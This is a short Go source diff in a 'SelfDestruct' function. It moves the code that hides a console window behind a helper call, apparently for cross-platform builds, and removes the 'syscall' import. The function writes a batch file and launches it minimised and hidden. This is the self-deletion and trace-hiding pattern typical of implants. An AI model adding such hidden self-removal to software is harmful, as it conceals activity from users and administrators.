@@ -5,7 +5,6 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
-	"syscall"
 )
 
 func SelfDestruct() {
@@ -37,9 +36,7 @@ func SelfDestruct() {
 		os.WriteFile(batPath, []byte(batContent), 0644)
 
 		cmd := exec.Command("cmd.exe", "/C", "start", "/min", batPath)
-		cmd.SysProcAttr = &syscall.SysProcAttr{
-			HideWindow: true,
-		}
+		setHideWindow(cmd)
 		cmd.Start()
 
 	default:
